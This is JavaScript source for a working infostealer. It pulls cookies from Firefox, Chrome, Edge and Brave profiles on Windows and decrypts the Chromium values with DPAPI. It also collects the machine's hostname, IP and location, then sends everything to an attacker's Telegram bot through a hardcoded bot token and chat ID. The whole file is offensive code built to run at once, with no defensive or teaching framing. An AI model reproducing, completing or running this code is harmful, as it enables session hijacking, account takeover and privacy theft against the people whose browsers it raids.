const fs = require('fs');
const path = require('path');
const os = require('os');             // ✅ only once
const sqlite3 = require('sqlite3').verbose();
const fetch = require('node-fetch');  
const FormData = require('form-data'); 
const dpapi = require('dpapi');       
const glob = require('glob');  

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
const TELEGRAM_CHAT_ID = "7574749243";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_FILE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
const OUTPUT_FILE = 'cookies.json';

// Browser paths
const BROWSER_PATHS = {
    "Chrome": path.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data"),
    "Edge": path.join(os.homedir(), "AppData", "Local", "Microsoft", "Edge", "User Data"),
    "Brave": path.join(os.homedir(), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
};

// Debug log
function debugLog(msg) {
    console.log(`[DEBUG] ${msg}`);
}

// Convert Chrome/Firefox expiry
function parseExpiry(expiry) {
    const value = parseInt(expiry, 10);
    return isNaN(value) ? null : value;
}

// Decrypt Chromium cookie
function decryptChromiumCookie(encryptedValue) {
    if (!encryptedValue || encryptedValue.length === 0) return null;

    // Remove "v10" prefix if present
    if (Buffer.isBuffer(encryptedValue) && encryptedValue.slice(0, 3).toString() === 'v10') {
        encryptedValue = encryptedValue.slice(3);
    }

    try {
        return dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');
    } catch (err) {
        debugLog(`❌ Failed to decrypt Chromium cookie: ${err}`);
        return null;
    }
}

// Extract Firefox cookies
function extractFirefoxCookies() {
    const cookiesList = [];
    const firefoxProfilesPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');

    if (!fs.existsSync(firefoxProfilesPath)) return cookiesList;

    const profiles = fs.readdirSync(firefoxProfilesPath);
    profiles.forEach(profile => {
        const dbPath = path.join(firefoxProfilesPath, profile, 'cookies.sqlite');
        if (!fs.existsSync(dbPath)) return;

        const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READONLY);
        db.serialize(() => {
            db.all(`SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`, (err, rows) => {
                if (err) return;
                rows.forEach(row => {
                    cookiesList.push({
                        domain: row.host,
                        name: row.name,
                        value: row.value,
                        path: row.path || '/',
                        expires: parseExpiry(row.expiry),
                        secure: !!row.isSecure,
                        httpOnly: !!row.isHttpOnly
                    });
                });
            });
        });
        db.close();
    });

    return cookiesList;
}

// Extract Chromium cookies
function extractChromiumCookies() {
    const cookiesList = [];

    for (const [browser, basePath] of Object.entries(BROWSER_PATHS)) {
        const expandedPaths = basePath.includes('*') ? glob.sync(basePath) : [basePath];

        expandedPaths.forEach(browserPath => {
            if (!fs.existsSync(browserPath)) return;

            const profileFolders = fs.readdirSync(browserPath).filter(f =>
                fs.statSync(path.join(browserPath, f)).isDirectory()
            );

            profileFolders.forEach(profile => {
                const cookiePath = path.join(browserPath, profile, 'Cookies');
                if (!fs.existsSync(cookiePath)) return;

                const db = new sqlite3.Database(cookiePath, sqlite3.OPEN_READONLY);
                db.serialize(() => {
                    db.all(`SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies`, (err, rows) => {
                        if (err) return;
                        rows.forEach(row => {
                            const decryptedValue = decryptChromiumCookie(row.encrypted_value);
                            cookiesList.push({
                                domain: row.host_key,
                                name: row.name,
                                value: decryptedValue,
                                path: row.path || '/',
                                expires: parseExpiry(row.expires_utc),
                                secure: !!row.is_secure,
                                httpOnly: !!row.is_httponly
                            });
                        });
                    });
                });
                db.close();
            });
        });
    }

    return cookiesList;
}

// Get system info
async function getSystemInfo() {
    try {
        const computerName = os.hostname();
        const ipRes = await fetch('https://api64.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ipAddress = ipData.ip || 'Unknown';
        const locRes = await fetch(`https://ipinfo.io/${ipAddress}/json`);
        const locData = await locRes.json();
        const location = `${locData.city || 'Unknown'}, ${locData.country || 'Unknown'}`;
        return `🖥 Computer: ${computerName}\n🌐 IP: ${ipAddress}\n📍 Location: ${location}`;
    } catch (err) {
        return '⚠️ Could not retrieve system details.';
    }
}

// Test Telegram
async function testTelegram() {
    try {
        const res = await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "Test: Telegram bot is connected!" })
        });
        if (res.ok) debugLog("✅ Telegram bot connected!");
        else debugLog(`❌ Telegram test failed: ${await res.text()}`);
    } catch (err) {
        debugLog(`❌ Telegram test error: ${err}`);
    }
}

// Save cookies and send to Telegram
async function saveAndSendCookies() {
    const cookies = extractFirefoxCookies().concat(extractChromiumCookies());

    if (!cookies.length) {
        debugLog("⚠️ No cookies extracted.");
        return;
    }

    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(cookies, null, 4), { encoding: 'utf-8' });
    debugLog(`✅ Cookies saved to ${OUTPUT_FILE}`);

    // Send system info
    const sysInfo = await getSystemInfo();
    await fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: sysInfo })
    });

    // Send JSON file
    const fileStream = fs.createReadStream(OUTPUT_FILE);
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', fileStream);

    try {
        const response = await fetch(TELEGRAM_FILE_URL, { method: 'POST', body: form });
        if (response.ok) debugLog("✅ Cookies sent to Telegram!");
        else debugLog(`❌ Telegram error: ${await response.text()}`);
    } catch (err) {
        debugLog(`❌ Error sending cookies file: ${err}`);
    }
}

// Run
(async () => {
    await testTelegram();
    await saveAndSendCookies();
})();
